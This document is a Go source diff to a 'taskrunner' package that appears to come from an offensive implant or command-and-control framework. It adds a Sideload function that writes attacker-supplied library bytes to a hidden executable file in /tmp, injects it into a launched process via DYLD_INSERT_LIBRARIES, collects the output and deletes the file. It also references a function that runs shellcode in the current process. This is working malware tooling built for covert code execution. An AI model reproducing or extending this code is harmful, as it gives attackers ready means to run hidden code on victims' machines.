@@ -19,16 +19,20 @@ package taskrunner
 */
 
 import (
+	"bytes"
+	"fmt"
+	"io/ioutil"
+	"sync"
+
+	//{{if .Debug}}
+	"log"
+	//{{end}}
+	"os"
+	"os/exec"
 	"runtime"
 	"syscall"
 	"unsafe"
 )
-
-// Get the page containing the given pointer
-// as a byte slice.
-func getPage(p uintptr) []byte {
-	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
-}
 
 // LocalTask - Run a shellcode in the current process
 // Will hang the process until shellcode completion
@@ -51,4 +55,46 @@ func LocalTask(data []byte, rwxPages bool) error {
 // RemoteTask -
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
 	return nil
+}
+
+// Sideload - Side load a library and return its output
+func Sideload(procName string, data []byte, args string) (string, error) {
+	var (
+		stdOut bytes.Buffer
+		stdErr bytes.Buffer
+		wg     sync.WaitGroup
+	)
+	fdPath := fmt.Sprintf("/tmp/.%s", randomString(10))
+	err := ioutil.WriteFile(fdPath, data, 0755)
+	if err != nil {
+		return "", err
+	}
+	env := os.Environ()
+	newEnv := []string{
+		fmt.Sprintf("LD_PARAMS=%s", args),
+		fmt.Sprintf("DYLD_INSERT_LIBRARIES=%s", fdPath),
+	}
+	env = append(env, newEnv...)
+	cmd := exec.Command(procName)
+	cmd.Env = env
+	cmd.Stdout = &stdOut
+	cmd.Stderr = &stdErr
+	//{{if .Debug}}
+	log.Printf("Starting %s\n", cmd.String())
+	//{{end}}
+	wg.Add(1)
+	go startAndWait(cmd, &wg)
+	// Wait for process to terminate
+	wg.Wait()
+	// Cleanup
+	os.Remove(fdPath)
+
+	if len(stdErr.Bytes()) > 0 {
+		return "", fmt.Errorf(stdErr.String())
+	}
+	//{{if .Debug}}
+	log.Printf("Done, stdout: %s\n", stdOut.String())
+	log.Printf("Done, stderr: %s\n", stdErr.String())
+	//{{end}}
+	return stdOut.String(), nil
 }
